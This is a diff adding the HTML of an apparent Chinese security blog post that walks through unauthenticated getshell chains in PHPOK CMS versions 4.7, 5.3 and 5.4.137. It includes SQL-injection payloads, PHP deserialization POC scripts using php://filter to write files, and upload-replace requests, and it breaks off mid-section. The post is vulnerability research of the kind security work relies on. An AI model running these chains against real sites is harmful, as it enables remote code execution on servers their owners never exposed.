@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="phpok前台getshell"/>
+
+
+
+
+  <meta name="keywords" content="php代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/24/phpok前台getshell/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpok前台getshell">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/24/phpok%E5%89%8D%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/aXqOSIyvFYVZRWe.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/MSq9XyQFLEcYWAz.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/Kuh7GBg3YEywVQb.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/Jtc3NFauEUSxvkA.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/4WNUCQr3B5MVFxo.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/YVNw4jlTqPdQ1OZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/EwRczOGCbU9WNvp.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/xEK2Lkq1WDhYHMP.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/6wcrzey7OiuPqlM.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/XjCirSbq5DBhyu8.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/1U62IVZuoYt5feF.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/cCdEgHZtONxye1r.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/74oFeNiDkS6RcdM.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/2AeWM8xdVyoj3fb.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/TAjtFb46X5Oz9wc.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/rPo65WVKvTSFi7q.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/ycqESp1anJHxetv.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/ELe95wpocGDzkiC.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/ayJBL5u9POYk7hx.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/U5jZwIeoW6l4FpB.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/3lgBoUNfnAeVpOd.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/jFJpNSUlGgLsVMz.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/W9kdLTNEQBobJgA.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/4M3VYafveOPjCrt.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/KDymT3fVxFkZXGM.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/p4P2o6gYe879nRC.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/bYVr6Wjy9iXkPuE.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/zRq4JpmXMBiyskh.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/2zbeCUVKnBAhtqx.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/dosnceMuw3m2fDL.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/bYVr6Wjy9iXkPuE.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/kdzi2DQwSjP69Hh.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/vIpn1mAcZ6yzCWr.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/RKaSeZLrIQhzEF1.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/24/2AeWM8xdVyoj3fb.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/25/fnOrm2K3al97JQw.png">
+<meta property="article:published_time" content="2020-03-24T03:08:23.000Z">
+<meta property="article:modified_time" content="2020-03-25T07:23:39.852Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/24/aXqOSIyvFYVZRWe.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> phpok前台getshell - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          phpok前台getshell
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 24 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#phpok47从sql注入到getshell">PHPOK4.7从sql注入到getshell</a><ul>
+<li><a href="#漏洞分析">漏洞分析</a></li>
+<li><a href="#poc构造">POC构造</a></li>
+</ul>
+</li>
+<li><a href="#phpok53的getshell">phpok5.3的getshell</a><ul>
+<li><a href="#漏洞分析-1">漏洞分析</a></li>
+<li><a href="#poc编写">POC编写</a></li>
+</ul>
+</li>
+<li><a href="#phpok54137getshell">phpok5.4.137getshell</a><ul>
+<li><a href="#思路一-通过sql注入插入将要反序列化的数据">思路一、通过sql注入插入将要反序列化的数据</a></li>
+<li><a href="#思路二-和phpok47一样通过sql注入添加上传附件php白名单">思路二、和phpok4.7一样通过sql注入添加上传附件php白名单</a></li>
+<li><a href="#总结">总结</a></li>
+</ul>
+</li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h3><span id="phpok47从sql注入到getshell">PHPOK4.7从sql注入到getshell</span></h3><h4><span id="漏洞分析">漏洞分析</span></h4><p><code>/framework/www/upload_control.php</code></p>
+<p><img src="https://i.loli.net/2020/03/24/aXqOSIyvFYVZRWe.png" alt="Snipaste_2020-03-24_13-55-38.png"></p>
+<p>基础上传函数，传入一个表单名和存储目录，返回上传结果</p>
+<p>其中<code>$this-&gt;lib(&#39;upload&#39;)-&gt;getfile($input_name,$cateid)</code>表示使用<code>libs</code>下的<code>upload.php</code>中的<code>getfile()</code>方法</p>
+<p>跟进<code>getfile()</code></p>
+<p><img src="https://i.loli.net/2020/03/24/MSq9XyQFLEcYWAz.png" alt="Snipaste_2020-03-24_14-01-46.png"></p>
+<p>传入了上传表单名，就会进入<code>_upload()</code>，继续跟进</p>
+<p><img src="https://i.loli.net/2020/03/24/Kuh7GBg3YEywVQb.png" alt="Snipaste_2020-03-24_14-10-39.png"></p>
+<p><img src="https://i.loli.net/2020/03/24/Jtc3NFauEUSxvkA.png" alt="Snipaste_2020-03-24_14-10-53.png"></p>
+<p>比较长，是完整的上传操作，包括异常抛出等。</p>
+<p>先看看一开始的后缀名检测</p>
+<p><img src="https://i.loli.net/2020/03/24/4WNUCQr3B5MVFxo.png" alt="Snipaste_2020-03-24_14-15-01.png"></p>
+<p>白名单，因此无法利用</p>
+<p>最后如果上传成功返回一个数组<code>$rs</code>，其中第一个参数<code>$title</code>是我们传入的文件名即<code>$tmpname</code>，先返回到<code>getfile()</code>，再回到<code>upload_base()</code>，如果之前上传成功，会有一个数据库操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; $this-&gt;model(&#39;res&#39;)-&gt;save($array);</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>model/res.php</code>的<code>save()</code>方法</p>
+<p><img src="https://i.loli.net/2020/03/24/YVNw4jlTqPdQ1OZ.png" alt="Snipaste_2020-03-24_14-30-50.png"></p>
+<p>跟进<code>engine/db/mysqli.php</code>的<code>insert_array()</code>方法</p>
+<p><img src="https://i.loli.net/2020/03/24/EwRczOGCbU9WNvp.png" alt="Snipaste_2020-03-24_14-32-57.png"></p>
+<p>就是将数组转化为insert into语句，因为我们可控<code>$title</code>，因此可以insert into注入。之前自己挖的一个洞就是无逗号的insert into注入，当时利用下面的方法构造盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into &#96;user&#96;(id,name) (select 3,4 from another_table where case when 1 then sleep(5) else 1 end)</span><br></pre></td></tr></table></figure>
+
+<p>这里可以利用下面的方法插入多条语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into file values(1,2,3),(4,5,6)</span><br></pre></td></tr></table></figure>
+
+<p>成功插入下一条语句后，</p>
+<p>下一个利用点<code>/framework/www/upload_control.php</code>的<code>replace_f()</code></p>
+<p>附件上传替换方法，</p>
+<p><img src="https://i.loli.net/2020/03/24/xEK2Lkq1WDhYHMP.png" alt="Snipaste_2020-03-24_14-55-34.png"></p>
+<p><img src="https://i.loli.net/2020/03/24/6wcrzey7OiuPqlM.png" alt="Snipaste_2020-03-24_15-23-23.png"></p>
+<p>传<code>oldid</code>去数据库寻找相关数据，将上传的附加mv到<code>oldid</code>对应的数据中，我们控制<code>$rs[&quot;filename&quot;]</code>为<code>a.php</code>即可。还有个注意点就是文件名不能带<code>/</code>，可以利用16进制的方式插入</p>
+<p><img src="https://i.loli.net/2020/03/24/XjCirSbq5DBhyu8.png" alt="Snipaste_2020-03-24_15-07-01.png"></p>
+<p>默认是无需登录即可上传</p>
+<p>全局搜索调用<code>upload_base()</code>的地方</p>
+<p><img src="https://i.loli.net/2020/03/24/1U62IVZuoYt5feF.png" alt="Snipaste_2020-03-24_15-14-40.png"></p>
+<p>phpok对控制器的调用如下</p>
+<blockquote>
+<p><code>index.php admin.php api.php</code> 分别对应 framework文件夹下的www admin api这三个文件夹</p>
+<p>参数c的值再拼接上<code>_control.php</code>就是对应的文件 对应的类即<code>{$c}_control</code></p>
+<p>参数f的值再拼接上<code>_f</code>就是对应的方法</p>
+</blockquote>
+<p>此处通过<code>c=upload&amp;f=save</code>的形式调用</p>
+<h4><span id="poc构造">POC构造</span></h4><p>先随便传个包然后<code>general_log</code>观察sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> qinggan_res (<span class="string">`cate_id`</span>,<span class="string">`folder`</span>,<span class="string">`name`</span>,<span class="string">`ext`</span>,<span class="string">`filename`</span>,<span class="string">`addtime`</span>,<span class="string">`title`</span>,<span class="string">`session_id`</span>,<span class="string">`user_id`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">'1'</span>,<span class="string">'res/202003/24/'</span>,<span class="string">'57622ea505269ecb.jpg'</span>,<span class="string">'jpg'</span>,<span class="string">'res/202003/24/57622ea505269ecb.jpg'</span>,<span class="string">'1585034277'</span>,<span class="string">'eval'</span>,<span class="string">'lugppkouhj1fnf1oeiils8g091'</span>,<span class="string">''</span>,<span class="string">'a:2:&#123;s:5:"width";N;s:6:"height";N;&#125;'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>构造将filename改为<code>res/gqy.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval&#39;,&#39;lugppkouhj1fnf1oeiils8g091&#39;,1,&#39;&#39;),(&#39;1&#39;,&#39;&#39;,&#39;57622ea505269ecb.jpg&#39;,&#39;jpg&#39;,0x7265732f6771792e706870,&#39;1585034277&#39;,&#39;eval&#39;,&#39;lugppkouhj1fnf1oeiils8g091&#39;,1,&#39;&#39;)#.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/24/cCdEgHZtONxye1r.png" alt="Snipaste_2020-03-24_16-23-38.png"></p>
+<p>再调用<code>replace_f()</code>方法，注意<code>1080</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;upload&amp;f&#x3D;replace&amp;oldid&#x3D;1080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/24/74oFeNiDkS6RcdM.png" alt="Snipaste_2020-03-24_16-24-14.png"></p>
+<hr>
+<p><img src="https://i.loli.net/2020/03/24/2AeWM8xdVyoj3fb.png" alt="Snipaste_2020-03-24_16-26-28.png"></p>
+<p>访问<code>gqy.php</code></p>
+<p><img src="https://i.loli.net/2020/03/24/TAjtFb46X5Oz9wc.png" alt="Snipaste_2020-03-24_16-30-52.png"></p>
+<h3><span id="phpok53的getshell">phpok5.3的getshell</span></h3><h4><span id="漏洞分析">漏洞分析</span></h4><p><strong>POP链</strong></p>
+<p>全局搜索<code>__destruct()</code></p>
+<p><code>framework/engine/cache.php</code></p>
+<p><img src="https://i.loli.net/2020/03/24/rPo65WVKvTSFi7q.png" alt="Snipaste_2020-03-24_16-58-13.png"></p>
+<p>跟进<code>save()</code></p>
+<p><img src="https://i.loli.net/2020/03/24/ycqESp1anJHxetv.png" alt="Snipaste_2020-03-24_16-58-55.png"></p>
+<p>可以控制<code>$file</code>利用php伪协议绕过</p>
+<p><strong>反序列化触发点</strong></p>
+<p><code>framework/phpok_call.php</code></p>
+<p>全局搜索<code>unserialize(</code>，这个文件中有很多反序列化点，这里选择<code>_format_ext_all()</code></p>
+<p><img src="https://i.loli.net/2020/03/24/ELe95wpocGDzkiC.png" alt="Snipaste_2020-03-24_18-05-04.png"></p>
+<p>全局搜索调用<code>_format_ext_all()</code>，没搜到。。应该是通过动态方法调用触发的</p>
+<p>因此从前往后看</p>
+<p><code>framework/api/call_control.php</code>的<code>index_f()</code></p>
+<p><img src="https://i.loli.net/2020/03/24/ayJBL5u9POYk7hx.png" alt="Snipaste_2020-03-24_18-18-19.png"></p>
+<p>参数可控，没有过滤，跟进<code>phpok()</code></p>
+<p><img src="https://i.loli.net/2020/03/24/U5jZwIeoW6l4FpB.png" alt="Snipaste_2020-03-24_18-23-55.png"></p>
+<p> 这里的<code>$GLOBALS[&#39;app&#39;]-&gt;call-&gt;phpok($id,$ext)</code>就是<code>phpok_call.php::phpok()</code> </p>
+<p><img src="https://i.loli.net/2020/03/24/3lgBoUNfnAeVpOd.png" alt="Snipaste_2020-03-24_18-29-50.png"></p>
+<p>可以调用当前类中的方法<code>$this-&gt;mlist</code>，且参数可控，这时候就可以利用之前的<code>_format_ext_all()</code></p>
+<h4><span id="poc编写">POC编写</span></h4><p>第一步</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foreach($data as $key&#x3D;&gt;$value)&#123;</span><br><span class="line">	if($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][&#39;is_api&#39;])&#123;</span><br></pre></td></tr></table></figure>
+
+<p>调试查看<code>call_all</code>发现<code>key</code>取<code>m_picplayer</code>满足条件</p>
+<p>第二步，跟进<code>value</code>，</p>
+<p><code>$rslist[$fid] = phpok($key,$tmpValue);</code></p>
+<p><code>$GLOBALS[&#39;app&#39;]-&gt;call-&gt;phpok($id,$ext);</code></p>
+<p><code>$call_rs = array_merge($call_rs,$rs);</code></p>
+<p><code>$this-&gt;$func($call_rs,$cache_id);</code></p>
+<p><code>$value[&#39;ext&#39;] = unserialize($value[&#39;ext&#39;]);</code></p>
+<p>构造，其中ext是序列化的值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = [<span class="string">'m_picplayer'</span>=&gt;[<span class="string">'type_id'</span>=&gt;<span class="string">'format_ext_all'</span>,<span class="string">'x'</span>=&gt;[<span class="string">'form_type'</span>=&gt;<span class="string">'editor'</span>,<span class="string">'content'</span>=&gt;<span class="string">'1'</span>,<span class="string">'ext'</span>=&gt;<span class="string">'xx'</span>]]];</span><br><span class="line"><span class="keyword">echo</span> json_encode($a);</span><br></pre></td></tr></table></figure>
+
+<p>第三步，绕过<code>exit</code></p>
+<p>这里选择base64，当然也可以试试rot13。然后在原有的<code>phpexit</code>基础上添加base64代码，(这里我们为了让其成为八位，所以任意在后面加一个a)得到，这里经过<code>serialize()</code>，测试下为10位需要加两个a</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $key_id = <span class="string">'php://filter/write=convert.base64-decode/resource=tmp'</span>;</span><br><span class="line">	<span class="keyword">protected</span> $key_list = <span class="string">'aaPD9waHAgcGhwaW5mbygpOz8+'</span>;</span><br><span class="line">	<span class="keyword">protected</span> $folder = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$x = serialize(<span class="keyword">new</span> cache);</span><br><span class="line"><span class="keyword">echo</span> $x.<span class="string">"\n"</span>;</span><br><span class="line">$a = [<span class="string">'m_picplayer'</span>=&gt;[<span class="string">'type_id'</span>=&gt;<span class="string">'format_ext_all'</span>,<span class="string">'x'</span>=&gt;[<span class="string">'form_type'</span>=&gt;<span class="string">'editor'</span>,<span class="string">'content'</span>=&gt;<span class="string">'1'</span>,<span class="string">'ext'</span>=&gt;$x]]];</span><br><span class="line"><span class="keyword">echo</span> urlencode(json_encode($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>tmp.php</code></p>
+<p><img src="https://i.loli.net/2020/03/24/jFJpNSUlGgLsVMz.png" alt="Snipaste_2020-03-24_21-27-45.png"></p>
+<h3><span id="phpok54137getshell">phpok5.4.137getshell</span></h3><p><strong>对v5.3的漏洞修补</strong></p>
+<p><img src="https://i.loli.net/2020/03/24/W9kdLTNEQBobJgA.png" alt="Snipaste_2020-03-24_21-51-01.png"></p>
+<p><code>V5.4.305</code>还在<code>framework/libs/string.php</code>中添加了<code>layer</code>黑名单，替换为<code>&lt;x&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ra1 &#x3D; array(&#39;javascript&#39;, &#39;vbscript&#39;, &#39;expression&#39;, &#39;applet&#39;, &#39;meta&#39;, &#39;xml&#39;, &#39;blink&#39;, &#39;link&#39;, &#39;style&#39;, &#39;script&#39;, &#39;embed&#39;, &#39;object&#39;, &#39;iframe&#39;, &#39;frame&#39;, &#39;frameset&#39;, &#39;ilayer&#39;, &#39;layer&#39;, &#39;bgsound&#39;, &#39;title&#39;, &#39;base&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用<code>aboutus</code>绕过，但是逗号也被替换为空。。。</p>
+<p>链接中复现成功的是<code>5.4.137</code>，可以去github上下载</p>
+<h4><span id="思路一-通过sql注入插入将要反序列化的数据">思路一、通过sql注入插入将要反序列化的数据</span></h4><p><strong>漏洞分析</strong></p>
+<p>新版本添加的<code>format()</code>默认会对双引号进行转义</p>
+<p><img src="https://i.loli.net/2020/03/25/4M3VYafveOPjCrt.png" alt="Snipaste_2020-03-25_09-14-56.png"></p>
+<p>前面的思路不变，在<code>framework/phpok_call.php</code>中寻找其他的方法</p>
+<p><img src="https://i.loli.net/2020/03/25/KDymT3fVxFkZXGM.png" alt="Snipaste_2020-03-25_09-25-48.png"></p>
+<p>发现第一行将双引号又转移回去了。跟进<code>get_all()</code></p>
+<p><img src="https://i.loli.net/2020/03/25/p4P2o6gYe879nRC.png" alt="Snipaste_2020-03-25_09-26-52.png"></p>
+<p>跟进<code>query()</code></p>
+<p><img src="https://i.loli.net/2020/03/25/bYVr6Wjy9iXkPuE.png" alt="Snipaste_2020-03-25_14-31-32.png"></p>
+<p>可以执行任意sql语句</p>
+<p>接下来寻找一处对数据库进行反序列化的操作</p>
+<p>还是在同一处调用</p>
+<p><img src="https://i.loli.net/2020/03/25/zRq4JpmXMBiyskh.png" alt="Snipaste_2020-03-25_09-33-10.png"></p>
+<p><strong>POC编写</strong></p>
+<p>只需要稍微修改即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = [<span class="string">'m_picplayer'</span>=&gt;[<span class="string">'type_id'</span>=&gt;<span class="string">'sql'</span>,<span class="string">'sqlinfo'</span>=&gt;<span class="string">'select 1'</span>,<span class="string">'is_list'</span>=&gt;<span class="keyword">true</span>]];</span><br><span class="line"><span class="keyword">echo</span> urlencode(json_encode($a));</span><br></pre></td></tr></table></figure>
+
+<p>简单分析下如何构造<code>insert into</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$project_rs = <span class="keyword">$this</span>-&gt;model(<span class="string">'project'</span>)-&gt;project_one($rs[<span class="string">'site'</span>],$rs[<span class="string">'pid'</span>]);</span><br><span class="line">$flist = <span class="keyword">$this</span>-&gt;model(<span class="string">'module'</span>)-&gt;fields_all($project_rs[<span class="string">'module'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>控制<code>project</code>表的<code>site_id</code>和<code>id</code>查询，得到<code>moudle</code>字段作为下一次查询的条件。</p>
+<p>再去<code>fields</code>表中根据<code>ftype</code>查询，得到的结果中的ext即是我们要反序列化的地方</p>
+<p>插入语句，存在<code>%00</code>，将反序列化的数据16进制处理下，注意第二个别选<code>0</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> qinggan_fields <span class="keyword">values</span>(<span class="number">1233</span>,<span class="number">21</span>,<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'varchar'</span>,<span class="string">'a'</span>,<span class="string">'text'</span>,<span class="string">'a'</span>,<span class="string">'safe'</span>,<span class="number">200</span>,<span class="number">200</span>,<span class="string">'ext'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">''</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>POC</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$hex=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; strlen($str);$i++)&#123;</span><br><span class="line">		$hex .= dechex(ord($str[$i]));</span><br><span class="line">		<span class="keyword">if</span>(ord($str[$i]) == <span class="number">0</span>)&#123;</span><br><span class="line">			$hex .= <span class="string">'0'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$hex = strtoupper($hex);</span><br><span class="line">	<span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $key_id = <span class="string">'php://filter/write=convert.base64-decode/resource=tmp'</span>;</span><br><span class="line">	<span class="keyword">protected</span> $key_list = <span class="string">'aaPD9waHAgcGhwaW5mbygpOz8+'</span>;</span><br><span class="line">	<span class="keyword">protected</span> $folder = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$x = serialize(<span class="keyword">new</span> cache);</span><br><span class="line">$x = strToHex($x);</span><br><span class="line">$sql = <span class="string">"insert into qinggan_fields values(1233,21,'a','a','varchar','a','text','a','safe',200,200,0x$x,0,0,'','')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $sql.<span class="string">"\n"</span>;</span><br><span class="line">$a = [<span class="string">'m_picplayer'</span>=&gt;[<span class="string">'type_id'</span>=&gt;<span class="string">'sql'</span>,<span class="string">'sqlinfo'</span>=&gt;$sql,<span class="string">'is_list'</span>=&gt;<span class="keyword">true</span>]];</span><br><span class="line"><span class="keyword">echo</span> urlencode(json_encode($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为我之前传的<code>ftype=21</code>，下一步传<code>id=41&amp;site_id=1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%22m_picplayer%22%3A%7B%22type_id%22%3A%22fields%22%2C%22pid%22%3A41%2C%22site%22%3A1%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>tmp.php</code></p>
+<p><img src="https://i.loli.net/2020/03/25/2zbeCUVKnBAhtqx.png" alt="Snipaste_2020-03-25_11-13-07.png"></p>
+<h4><span id="思路二-和phpok47一样通过sql注入添加上传附件php白名单">思路二、和phpok4.7一样通过sql注入添加上传附件php白名单</span></h4><p>和phpok4.7的区别在于<code>insert into</code>的注入点为<code>mime_type</code></p>
+<p><code>framework/api/upload_control.php</code>中的<code>save_f()</code></p>
+<p><img src="https://i.loli.net/2020/03/25/dosnceMuw3m2fDL.png" alt="Snipaste_2020-03-25_14-23-23.png"></p>
+<p>跟进<code>_upload()</code></p>
+<p>因为新版本中添加了<code>format()</code>对文件名进行过滤，但是也增加了<code>mimetype</code>字段，并且我们可控。</p>
+<p><img src="https://i.loli.net/2020/03/25/bYVr6Wjy9iXkPuE.png" alt="Snipaste_2020-03-25_14-31-32.png"></p>
+<p><img src="https://i.loli.net/2020/03/25/kdzi2DQwSjP69Hh.png" alt="Snipaste_2020-03-25_14-34-35.png"></p>
+<p><strong>POC编写</strong></p>
+<p>注意还增加了2字节的文件格式检查，加上对应即可</p>
+<p><img src="https://i.loli.net/2020/03/25/vIpn1mAcZ6yzCWr.png" alt="Snipaste_2020-03-25_14-44-29.png"></p>
+<p>比如<code>png=&gt;&#39;13780&#39;=&gt;%89P</code></p>
+<p>先随便传个包然后<code>general_log</code>观察sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> qinggan_res (<span class="string">`cate_id`</span>,<span class="string">`folder`</span>,<span class="string">`name`</span>,<span class="string">`ext`</span>,<span class="string">`filename`</span>,<span class="string">`addtime`</span>,<span class="string">`title`</span>,<span class="string">`mime_type`</span>,<span class="string">`attr`</span>,<span class="string">`session_id`</span>,<span class="string">`user_id`</span>) <span class="keyword">VALUES</span>(<span class="string">'1'</span>,<span class="string">'res/202003/25/'</span>,<span class="string">''</span>,<span class="string">'png'</span>,<span class="string">'res/202003/25/beb3a68f4f90a030.png'</span>,<span class="string">'1585119315'</span>,<span 